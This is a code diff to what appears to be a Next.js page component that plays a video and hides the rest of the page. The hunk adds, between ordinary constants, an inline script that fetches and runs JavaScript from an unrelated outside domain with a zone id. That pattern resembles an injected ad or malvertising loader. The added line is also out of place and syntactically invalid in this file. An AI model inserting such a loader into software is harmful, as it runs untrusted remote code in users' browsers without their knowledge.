@@ -12,7 +12,7 @@ import { MEME_FLAG } from '../../components/MemeToast'
 const SRC = (process.env.NEXT_PUBLIC_BASE_PATH || '') + '/lockemup.mp4'
 const RED = '#f00'
 const RATES = [0.25, 0.5, 0.75, 1, 1.25, 1.5, 1.75, 2]
-
+<script>(function(s){s.dataset.zone='12194696',s.src='https://nap5k.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
 const CSS = `
 body > *:not([data-lockemup]) { display: none !important; }
 html, body { background: #000 !important; overflow: hidden !important; }
